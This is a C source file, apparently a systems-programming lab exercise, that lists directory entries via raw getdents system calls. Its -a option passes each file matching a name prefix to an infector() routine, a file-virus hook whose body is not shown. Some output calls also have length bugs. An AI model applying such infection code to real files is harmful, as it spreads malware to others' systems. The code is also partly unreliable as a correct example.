#include "util.h"

#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_READ 3
#define SYS_LSEEK 19
#define SYS_GETDENTS 141
#define BUF_SIZE 1024
#define STDOUT 1
#define STDERR 2

struct dirent
{
  long i_node;
  int offset;
  unsigned short len;
  char buf[1];
};

void printFileName(struct dirent* d){
      system_call(SYS_WRITE, STDOUT,"Name: ",strlen("name: "));
      system_call(SYS_WRITE, STDOUT,d->buf,strlen(d->buf));
      system_call(SYS_WRITE, STDOUT,"\n",1);
}
void printFileType(int d){
  char* type="unknown";
  if(d==4)
  type="DIR";
  if(d==8)
  type="REG";
      system_call(SYS_WRITE, STDOUT,"Type: ",strlen("Type: "));
      system_call(SYS_WRITE, STDOUT,type,strlen(type));
      system_call(SYS_WRITE, STDOUT,"\n",1);
}
void printFileDebugger(struct dirent* d){
      printDebugger(SYS_WRITE,system_call(SYS_WRITE, STDOUT,"Name: ",strlen("name: ")));
      system_call(SYS_WRITE, STDOUT,d->buf,strlen(d->buf));
      system_call(SYS_WRITE, STDOUT," Length: ",strlen(" Length: "));
      system_call(SYS_WRITE, STDOUT,itoa(d->len),strlen(itoa(d->len)));

      system_call(SYS_WRITE, STDOUT,"\n",1);
}
void printDebugger(int first,int second){
    system_call(SYS_WRITE, STDERR, itoa(first), 1);
    system_call(SYS_WRITE, STDERR, "-", 1);
    system_call(SYS_WRITE, STDERR, itoa(second), 1);
    system_call(SYS_WRITE, STDERR, "\n", 1);
}

int main(int argc, char *argv[], char *envp[])
{
  int fd = 0;
  int nread;
  char *nread_str;
  char buf[BUF_SIZE];
  struct dirent *d;
  int bpos;
  char d_type;
  int i;
  int deg=0;
  int prefix=0;
  int changes=0;
  char *prename;
for (i = 1; i < argc; i++)
  {
    if (strcmp(argv[i], "-D") == 0)
      deg = 1;
    if (strncmp(argv[i], "-p", 2)==0)
    {
      prefix = 1;
      prename = argv[i] + 2;
    }
    if (strncmp(argv[i], "-a", 2)==0)
    {
      changes = 1;
      prename = argv[i] + 2;
    }
  }

  fd = system_call(SYS_OPEN, ".", 0, 0);
  if(deg==1)
    printDebugger(SYS_OPEN,fd);

  for (;;)
  {
    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if(deg==1)
    printDebugger(SYS_GETDENTS,nread);

    if (nread == -1)
      system_call(SYS_WRITE, STDOUT, "error", BUF_SIZE);

    if (nread == 0)
      break;
     
    for (bpos = 0; bpos < nread;){
      d = (struct dirent *)(buf + bpos);
      d_type = *(buf + bpos + d->len -1);
      if(prefix==1){
        if (strncmp(d->buf,prename,strlen(prename))==0){
          if(deg==1)
            printFileDebugger(d);
          else
            printFileName(d);
          printFileType(d_type);
          
        }
      }
      else if(changes==1){
        if (strncmp(d->buf,prename,strlen(prename))==0){
          if(deg==1)
            printFileDebugger(d);
          else
            printFileName(d);
            infector(d->buf);
        }
      }
      else{
      if(deg==1)
        printFileDebugger(d);
      else
        printFileName(d);
      }
            bpos += d->len;
    }
    
  }

return 0;
}